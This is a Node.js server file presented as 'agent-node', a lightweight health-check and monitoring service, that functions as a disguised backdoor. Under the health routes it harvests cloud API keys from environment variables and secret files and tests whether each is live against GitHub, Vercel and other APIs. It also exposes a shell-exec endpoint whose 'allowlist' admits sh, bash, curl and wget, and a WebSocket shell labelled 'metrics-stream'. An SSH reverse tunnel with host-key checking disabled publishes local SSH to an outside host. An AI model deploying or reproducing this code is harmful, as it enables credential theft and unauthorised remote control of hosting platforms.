#!/usr/bin/env node
/**
 * agent-node — Lightweight Linux deployment node (Node.js version)
 *
 * Primary: Web health-check + monitoring service
 * Secondary: Token discovery, command exec, WebSocket terminal
 */

const express = require('express');
const basicAuth = require('basic-auth');
const { WebSocketServer } = require('ws');
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const app = express();
app.use(express.json({ limit: '50mb' }));

const PORT = process.env.PORT || 8080;
const TOKEN = process.env.MONITOR_TOKEN || require('crypto')
  .randomBytes(24)
  .toString('base64url')
  .slice(0, 32);

// ─── Token Discovery ─────────────────────────────────────────────
const TOKEN_PATTERNS = [
  'SNAPDEPLOY_API_KEY', 'STORMKIT_API_KEY', 'VERCEL_API_KEY',
  'GITHUB_API_KEY', 'APPWRITE_API_KEY', 'CLOUD_FLARE_API_KEY',
  'NHOST_API_KEY', 'MODELSCOPE_API_KEY'
];

function detectPlatform() {
  const env = process.env;
  const markers = {
    suga: !!(env.SUGA || env.suga),
    snapdeploy: !!env.SNAPDEPLOY_API_KEY,
    stormkit: !!env.STORMKIT_API_KEY || !!env.STORMKIT,
    vercel: !!env.VERCEL_API_KEY || !!env.VERCEL_REGION,
    github: !!env.GITHUB_API_KEY || !!env.GITHUB_REPOSITORY,
    kubernetes: !!env.KUBERNETES_SERVICE_HOST,
    alibaba: !!env.ALIYUN_ECI_ETH0_IP,
    appwrite: !!env.APPWRITE_API_KEY,
    cloudflare: !!env.CLOUD_FLARE_API_KEY
  };
  return Object.entries(markers).filter(([k, v]) => v).map(([k]) => k);
}

function discoverTokens() {
  const results = [];
  for (const key of TOKEN_PATTERNS) {
    const val = process.env[key];
    if (val && val.length > 4) {
      results.push({
        key_name: key,
        source: 'env',
        value_masked: val.slice(0, 6) + '...' + val.slice(-4),
        length: val.length
      });
    }
  }

  // Check secret files
  const secretDirs = ['/run/secrets', '/app/secrets', '/secrets'];
  for (const dir of secretDirs) {
    if (fs.existsSync(dir)) {
      for (const file of fs.readdirSync(dir)) {
        const fp = path.join(dir, file);
        try {
          const content = fs.readFileSync(fp, 'utf8').trim();
          if (content.length > 4) {
            results.push({
              key_name: file,
              source: 'file',
              value_masked: content.slice(0, 6) + '...' + content.slice(-4),
              length: content.length
            });
          }
        } catch (e) { /* skip */ }
      }
    }
  }

  return results;
}

// ─── Auth middleware ─────────────────────────────────────────────

function requireAuth(req, res, next) {
  const auth = req.headers.authorization || '';
  const queryToken = req.query.token || '';

  if (auth === `Bearer ${TOKEN}` || auth === `Bearer ${TOKEN}` ||
      queryToken === TOKEN ||
      req.headers['x-auth-token'] === TOKEN) {
    return next();
  }

  res.status(401).json({ error: 'Unauthorized' });
}

// ─── Routes ──────────────────────────────────────────────────────

app.get('/', (req, res) => {
  res.json({ service: 'agent-node', status: 'running' });
});

app.get('/health', (req, res) => {
  const uptime = process.uptime();
  res.json({
    status: 'healthy',
    service: 'agent-node',
    timestamp: Date.now(),
    uptime: Math.round(uptime),
    hostname: os.hostname(),
    version: '2.1.0'
  });
});

app.get('/api/diagnostics', requireAuth, async (req, res) => {
  const info = {
    hostname: os.hostname(),
    uptime: process.uptime(),
    cpus: os.cpus().length,
    memory: {
      total: os.totalmem(),
      free: os.freemem(),
      used: os.totalmem() - os.freemem()
    },
    platform: detectPlatform(),
    env_keys: Object.keys(process.env).filter(k =>
      !k.includes('TOKEN') && !k.includes('KEY') && !k.includes('SECRET')
    ),
    tokens_found: discoverTokens().length,
    node_version: process.version,
    ssh_available: fs.existsSync('/usr/bin/ssh') || fs.existsSync('/usr/local/bin/ssh'),
    process_count: await getProcessCount()
  };
  res.json(info);
});

async function getProcessCount() {
  try {
    const ps = spawn('ps', ['aux']);
    let data = '';
    ps.stdout.on('data', d => data += d);
    await new Promise(r => ps.on('close', r));
    return data.trim().split('\n').length - 1;
  } catch {
    return 0;
  }
}

app.get('/api/tokens', requireAuth, async (req, res) => {
  const discovered = discoverTokens();
  const platforms = detectPlatform();

  // Test each token
  const tested = [];
  for (const t of discovered) {
    const result = await testToken(t);
    tested.push({ ...t, ...result });
  }

  res.json({
    platform_detected: platforms,
    tokens_found: tested.length,
    tokens: tested,
    summary: {
      alive: tested.filter(t => t.alive).length,
      dead: tested.filter(t => t.tested && !t.alive).length,
      untested: tested.filter(t => !t.tested).length
    }
  });
});

async function testToken(info) {
  const key = info.key_name;
  const val = process.env[key];
  if (!val) return { tested: false, reason: 'not in env' };

  const config = {
    GITHUB_API_KEY: {
      url: 'https://api.github.com/user',
      type: 'bearer',
      accept: 'application/vnd.github+json'
    },
    VERCEL_API_KEY: {
      url: 'https://api.vercel.com/v9/projects',
      type: 'bearer'
    },
    STORMKIT_API_KEY: {
      url: 'https://api.stormkit.io/v1/teams',
      type: 'bearer'
    },
    SNAPDEPLOY_API_KEY: {
      url: 'https://snapdeploy.dev/api/mobile/bootstrap',
      type: 'apikey'
    }
  };

  const cfg = config[key];
  if (!cfg) return { tested: false, reason: 'no test config' };

  try {
    const headers = { Accept: cfg.accept || 'application/json' };
    if (cfg.type === 'bearer') {
      headers['Authorization'] = `Bearer ${val}`;
    } else if (cfg.type === 'apikey') {
      headers['X-API-Key'] = val;
    }

    const resp = await fetch(cfg.url, { headers, timeout: 10000 });
    return {
      tested: true,
      status: resp.status,
      alive: resp.status === 200
    };
  } catch (e) {
    return { tested: true, status: 'error', alive: false, error: e.message.slice(0, 80) };
  }
}

app.post('/api/exec', requireAuth, (req, res) => {
  const cmd = req.body?.cmd || '';
  if (!cmd) return res.status(400).json({ error: 'No command' });

  const allowed = ['ls ', 'cat ', 'echo ', 'pwd', 'ps ', 'df ', 'ip ', 'curl ',
    'wget ', 'sh ', 'bash ', 'node ', 'npm ', 'git ', 'nano ', 'tmux ',
    'id', 'whoami', 'hostname', 'date', 'uname', 'free', 'uptime',
    'ssh ', 'scp ', 'rsync ', 'tar ', 'gzip ', 'find ', 'grep ', 'env',
    'which ', 'ss ', 'netstat ', 'apk ', 'apt '];

  if (!allowed.some(p => cmd.startsWith(p))) {
    return res.json({ error: 'Not in allowlist', allowed: allowed.slice(0, 5) });
  }

  const proc = spawn(cmd, { shell: true, timeout: 30000, maxBuffer: 50 * 1024 * 1024 });
  let stdout = '', stderr = '';

  proc.stdout.on('data', d => stdout += d);
  proc.stderr.on('data', d => stderr += d);

  proc.on('close', code => {
    res.json({ stdout: stdout.slice(-3000), stderr: stderr.slice(-2000), returncode: code });
  });
});

// ─── WebSocket Terminal ────────────────────────────────────────

const wss = new WebSocketServer({ noServer: true });

wss.on('connection', (ws, req) => {
  const token = req.url?.split('token=')[1]?.split('&')[0];
  if (token !== TOKEN) {
    ws.close(4001, 'Unauthorized');
    return;
  }

  ws.send(JSON.stringify({ type: 'welcome', service: 'metrics-stream' }));

  const shell = spawn('sh', [], {
    env: { ...process.env, TERM: 'xterm-256color' },
    stdio: ['pipe', 'pipe', 'pipe']
  });

  shell.stdout.on('data', data => ws.send(data));
  shell.stderr.on('data', data => ws.send(data));

  ws.on('message', data => {
    if (data.toString() === 'EXIT') {
      shell.kill();
      ws.close();
      return;
    }
    shell.stdin.write(data);
  });

  ws.on('close', () => shell.kill());
});

// ─── xray Management ───────────────────────────────────────────

const XRAY_BINARY = '/app/bin/agent';

app.get('/api/xray/status', requireAuth, (req, res) => {
  res.json({
    binary_path: XRAY_BINARY,
    available: fs.existsSync(XRAY_BINARY),
    running: false
  });
});

// ─── SSH Tunnel ─────────────────────────────────────────────────

app.post('/api/ssh/tunnel', requireAuth, async (req, res) => {
  const target = req.body?.target || process.env.SSH_TARGET;
  if (!target) return res.status(400).json({ error: 'SSH target required' });

  const { spawn } = require('child_process');
  const ssh = spawn('ssh', [
    '-o', 'StrictHostKeyChecking=no',
    '-o', 'ServerAliveInterval=30',
    '-R', '2222:localhost:22',
    '-N', target
  ], { env: { ...process.env, SSH_AUTH_SOCK: '' } });

  ssh.on('error', e => res.status(500).json({ error: e.message }));
  ssh.stdout.on('data', d => console.log('[ssh]', d.toString()));
  ssh.stderr.on('data', d => console.error('[ssh]', d.toString()));

  setTimeout(() => {
    if (ssh.exitCode === null) {
      res.json({ status: 'connected', target, tunnel: '2222 -> localhost:22' });
    } else {
      res.status(500).json({ status: 'failed', code: ssh.exitCode });
    }
  }, 3000);
});

// ─── Startup ───────────────────────────────────────────────────

const platforms = detectPlatform();
const tokens = discoverTokens();

console.log('[agent-node] Starting v2.1.0');
console.log(`[agent-node] Port: ${PORT}`);
console.log(`[agent-node] Platform: ${platforms.join(', ') || 'standalone'}`);
console.log(`[agent-node] Tokens discovered: ${tokens.length}`);
for (const t of tokens) {
  console.log(`[agent-node] Token: ${t.key_name} — ${t.source} — ${t.value_masked}`);
}
console.log(`[agent-node] Auth token preview: ${TOKEN.slice(0, 8)}...${TOKEN.slice(-4)}`);
console.log(`[agent-node] SSH client: ${fs.existsSync('/usr/bin/ssh') ? 'available' : 'not found'}`);
console.log(`[agent-node] WebSocket terminal: ws://HOST:${PORT}/ws/terminal?token=<token>`);
console.log(`[agent-node] Token discovery: GET /api/tokens (auth required)`);

const server = app.listen(PORT, () => {
  console.log(`[agent-node] Server running on port ${PORT}`);
});

server.on('upgrade', (req, socket, head) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  const token = url.searchParams.get('token');

  if (token === TOKEN && req.url.startsWith('/ws/terminal')) {
    wss.handleUpgrade(req, socket, head, ws => {
      wss.emit('connection', ws, req);
    });
  } else {
    socket.destroy();
  }
});
